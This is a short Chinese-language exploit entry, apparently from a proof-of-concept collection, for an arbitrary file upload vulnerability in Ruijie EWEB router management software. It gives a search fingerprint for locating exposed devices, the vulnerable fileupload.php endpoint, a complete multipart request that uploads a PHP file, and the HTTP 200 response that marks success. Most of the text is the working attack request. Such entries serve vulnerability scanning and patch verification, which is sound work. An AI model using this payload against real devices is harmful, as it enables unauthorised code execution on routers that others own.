# 锐捷EWEB路由器-fileupload.php存在任意文件上传漏洞

锐捷 ｜ 文件上传 ｜ —
- **指纹**：`title="锐捷网络-EWEB网管系统"`
- **请求**：`POST /ddi/server/fileupload.php HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryXarDTbMzZe2hdNu2
Content-Disposition: form-data; name="uploadDir"
upload
------WebKitFormBoundaryXarDTbMzZe2hdNu2
Content-Disposition: form-data; name="file";filename="123.php"
<?php phpinfo();?>
------WebKitFormBoundaryXarDTbMzZe2hdNu2--
```
- **响应特征**：200